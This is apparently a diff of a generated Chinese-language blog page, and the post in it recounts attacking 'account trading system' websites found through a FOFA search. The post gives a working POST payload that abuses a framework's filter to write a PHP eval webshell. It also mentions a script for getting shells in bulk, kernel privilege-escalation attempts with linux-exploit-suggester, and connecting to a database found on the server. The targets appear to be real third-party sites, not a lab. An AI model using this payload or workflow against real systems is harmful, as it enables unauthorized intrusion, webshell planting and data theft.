@@ -20,12 +20,12 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
   </script>
 
-  <meta name="description" content="前言php5 怎么bypass disable_functions啊，disable太狠了，找到个php7的还提权失败 FOFA 1intitle:账户交易系统">
+  <meta name="description" content="前言php5 怎么bypass disable_functions啊，disable太狠了，找到个php7的还提权失败 FOFA intitle:账户交易系统">
 <meta property="og:type" content="article">
 <meta property="og:title" content="账户交易系统">
 <meta property="og:url" content="http://example.com/2021/08/23/%E8%B4%A6%E6%88%B7%E4%BA%A4%E6%98%93%E7%B3%BB%E7%BB%9F/index.html">
 <meta property="og:site_name" content="Y0ng的博客">
-<meta property="og:description" content="前言php5 怎么bypass disable_functions啊，disable太狠了，找到个php7的还提权失败 FOFA 1intitle:账户交易系统">
+<meta property="og:description" content="前言php5 怎么bypass disable_functions啊，disable太狠了，找到个php7的还提权失败 FOFA intitle:账户交易系统">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/397788b042814302b02f98af636b7da5.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/0547adaec6e9433abfe077ec6eeadbc7.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
@@ -260,7 +260,7 @@
       
         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>php5 怎么bypass disable_functions啊，disable太狠了，找到个php7的还提权失败</p>
 <p>FOFA</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intitle:账户交易系统</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">intitle:账户交易系统</span><br></pre></td></tr></table></figure>
 
 <a id="more"></a>
 
@@ -268,7 +268,7 @@
 <p><img src="https://img-blog.csdnimg.cn/0547adaec6e9433abfe077ec6eeadbc7.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>直接getshell</p>
 <p><img src="https://img-blog.csdnimg.cn/04fc1decb79a4aec951029b83c9e1c99.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>url: /?s=index</p>
 <p>Post：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s&#x3D;file_put_contents(&#39;test2.php&#39;,&#39;&lt;?php eval($_POST[a]);&#39;)&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;assert</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s&#x3D;file_put_contents(&#39;test2.php&#39;,&#39;&lt;?php eval($_POST[a]);&#39;)&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;assert</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/5e8084265c2a402680439937d1a92aa4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>一看就是宝塔</p>
 <p>完蛋，tcl，不会利用，写了个脚本批量getshell，看能不能进一步操作</p>
@@ -285,13 +285,13 @@
 <p><a target="_blank" rel="noopener" href="https://github.com/InteliSecureLabs/Linux_Exploit_Suggester">Linux_Exploit_Suggester</a></p>
 <p><a target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester">linux-exploit-suggester</a></p>
 <p>启动：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;linux-exploit-suggester.sh</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;linux-exploit-suggester.sh</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/54ac13e3e8d749b087f28f1f192d8a9c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>编译时出错：</p>
 <p><img src="https://img-blog.csdnimg.cn/70e8ee47d06c4f1c852220ba68efc7ef.png#pic_center"><br>当出现：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc: error trying to exec &#39;cc1&#39;: execvp: No such file or directory</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc: error trying to exec &#39;cc1&#39;: execvp: No such file or directory</span><br></pre></td></tr></table></figure>
 <p>添加个路径就行了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -name cc1</span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;usr&#x2F;libexec&#x2F;gcc&#x2F;x86_64-redhat-linux&#x2F;4.8.2&#x2F;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -name cc1</span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;usr&#x2F;libexec&#x2F;gcc&#x2F;x86_64-redhat-linux&#x2F;4.8.2&#x2F;</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/8a8b174febdf49f2bc6439a9512968fe.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>尝试几次内核提权都没成功</p>
 <p>翻到了数据库文件连接一下</p>
